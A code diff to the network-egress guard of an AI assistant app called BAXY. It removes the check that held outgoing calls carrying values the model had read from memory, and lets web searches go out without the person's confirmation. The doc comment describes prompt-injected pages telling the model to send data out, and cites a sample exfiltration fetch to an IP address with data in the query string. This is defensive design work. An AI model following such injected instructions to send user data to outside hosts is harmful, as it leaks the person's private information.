@@ -10,30 +10,27 @@ namespace Baxy.App;
 
 /// <summary>
 /// BAXY Renew al máximo 11.5 (identity: «puede entrar información, no puede salir contenido del usuario»; lethal
-/// trifecta, OWASP LLM01, CaMeL): in a turn the person opened, a call that sends an address or a query out of the PC
-/// waits for their «sí» when it carries what only BAXY could put there. Two cases, as the cross check bounded it
-/// (VERIFICACION-pc-de-nb.md, 11.5): a value the model read from memory in this turn (memory.recall or memory.list, at
-/// least <see cref="MinimumRememberedCharacters"/> letters or digits, compared folded: case, accents, spacing and
-/// URL escapes aside), or a host that came neither from this session's results (their address fields: a search result,
-/// a page fetched or read, a tab) nor from the person's words (the site's name, «youtube» for www.youtube.com). A
+/// trifecta, OWASP LLM01, CaMeL): in a turn the person opened, a call waits for their «sí» only for what is really
+/// dangerous. Two cases. A call that goes out of the PC to a host that came neither from this session's results (their
+/// address fields: a search result, a page fetched or read, a tab) nor from the person's words (the site's name,
+/// «youtube» for www.youtube.com), <c>host_not_from_session</c>: the way out for what a page told the model to send. A
 /// search followed by the fetch of one of its results never waits. An address literal (an IP) carries no words: a ping
-/// to one goes, and so does a page in the person's own network (loopback, private, link-local), but a page at any
-/// other IP waits unless the person wrote it or a result gave it (auditoría de la App, 2026-10-23: a fetch of
-/// «http://203.0.113.9/?d=…» left the PC unasked, the plainest way out for what a page told the model to send). Which calls go out is the catalog's typed fact (al máximo 5.1: the network
-/// effect, with the call's exact arguments), and the address is the call's <c>url</c> or <c>host</c>. A heartbeat holds
-/// every such call already (NativeTurnLoop.BeatProposes).
+/// to one goes, and so does a page in the person's own network (loopback, private, link-local), but a page at any other
+/// IP waits unless the person wrote it or a result gave it (auditoría de la App, 2026-10-23: a fetch of
+/// «http://203.0.113.9/?d=…» left the PC unasked). And a game the person did not name, <c>game_title_not_said</c>.
+/// Searching or looking something up on the web never waits, whatever of the person's text or data it carries (owner's
+/// decision, 2026-10-25: only what is destructive or really dangerous asks; BAXY must not bother the person all the
+/// time). Which calls go out is the catalog's typed fact (al máximo 5.1: the network effect, with the call's exact
+/// arguments), and the address is the call's <c>url</c> or <c>host</c>. A heartbeat holds every such call already
+/// (NativeTurnLoop.BeatProposes).
 /// </summary>
 internal sealed class NetworkEgress
 {
-    /// <summary>The shortest remembered value looked for: a shorter one («sí», a year) is found in any address.</summary>
-    internal const int MinimumRememberedCharacters = 8;
-
     /// <summary>The most result hosts a held call's result lists (<see cref="ResultHosts"/>).</summary>
     internal const int MaximumResultHosts = 8;
 
     private readonly HashSet<string> _hosts = new(StringComparer.Ordinal);
     private readonly HashSet<string> _words = new(StringComparer.Ordinal);
-    private readonly List<string> _remembered = [];
     private readonly List<string> _resultHosts = [];
 
     /// <summary>
@@ -57,16 +54,6 @@ internal sealed class NetworkEgress
         if (!NativeTurnLoop.Has(operation, arguments, OperationEffects.Network))
         {
             return null;
-        }
-
-        foreach ((string _, JsonNode? value) in arguments)
-        {
-            if (value is JsonValue text && text.TryGetValue(out string? sent)
-                && Compact(Uri.UnescapeDataString(sent.Replace('+', ' '))) is var carried
-                && _remembered.Exists(remembered => carried.Contains(remembered, StringComparison.Ordinal)))
-            {
-                return "sends_remembered_value";
-            }
         }
 
         string? url = Text(arguments["url"]);
@@ -108,7 +95,7 @@ internal sealed class NetworkEgress
         }
     }
 
-    /// <summary>A call's result as the model reads it: its addresses, and what memory read in this turn.</summary>
+    /// <summary>A call's result as the model reads it: its addresses.</summary>
     internal void Observed(string operation, string observation)
     {
         JsonNode? facts;
@@ -124,13 +111,9 @@ internal sealed class NetworkEgress
         Walk(facts, operation is "memory.recall" or "memory.list");
     }
 
-    /// <summary>A new turn: what memory read in the last one is not this turn's.</summary>
-    internal void NewTurn() => _remembered.Clear();
-
     /// <summary>A new session: nothing seen or heard in the last one counts.</summary>
     internal void Reset()
     {
-        NewTurn();
         _hosts.Clear();
         _words.Clear();
         _resultHosts.Clear();
@@ -158,14 +141,6 @@ internal sealed class NetworkEgress
                                     _resultHosts.RemoveAt(0);
                                 }
                             }
-                        }
-
-                        // A record the projection shows (MemoryOperationResponseProjection: label and value; a
-                        // sensitive one redacted, so the model never read it).
-                        if (memoryRead && key == "value" && field != "[REDACTED]"
-                            && Compact(field) is { Length: >= MinimumRememberedCharacters } remembered)
-                        {
-                            _remembered.Add(remembered);
                         }
                     }
                     else
@@ -275,7 +250,4 @@ internal sealed class NetworkEgress
 
     private static string? Text(JsonNode? node) =>
         node is JsonValue value && value.TryGetValue(out string? text) && !string.IsNullOrWhiteSpace(text) ? text : null;
-
-    // Folded, letters and digits only: «Ñuñoa» and «nunoa-del-mar» are the same value.
-    private static string Compact(string text) => string.Concat(Folded(text).Where(char.IsLetterOrDigit));
 }
